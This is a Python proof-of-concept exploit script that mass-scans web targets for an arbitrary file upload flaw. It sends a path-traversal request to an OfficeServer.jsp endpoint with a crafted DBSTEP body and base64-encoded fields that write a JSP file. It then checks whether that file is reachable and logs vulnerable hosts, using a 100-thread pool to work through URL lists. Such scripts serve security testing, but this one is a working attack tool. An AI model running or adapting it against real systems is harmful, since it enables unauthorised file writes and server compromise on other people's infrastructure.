import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"Content-Type": "", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2", "Connection": "keep-alive"}
    data = "DBSTEP V3.0     351             0               666             \r\nDBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nFILETYPE=Li5cYS5qc3A=\r\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\r\nhelloword\r\n"
    payload = "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
    rsp1 = requests.get(url=target,verify=False)
    pro = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
    }
    if rsp1.status_code == 200:
        rsp2 = requests.post(url=target+payload,data=data,headers=headers,verify=False,proxies=pro)
        if 'DBSTEP V3.0' in rsp2.text:
            rsp3 = requests.get(url=target+"/a.jsp")
            if 'helloword' in rsp3.text:
                print(f'[+]{target}存在文件上传')
                with open('result.txt','a') as f:
                    f.write(target+'\n')
            else:
                print(f'[-]{target}不存在文件上传')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()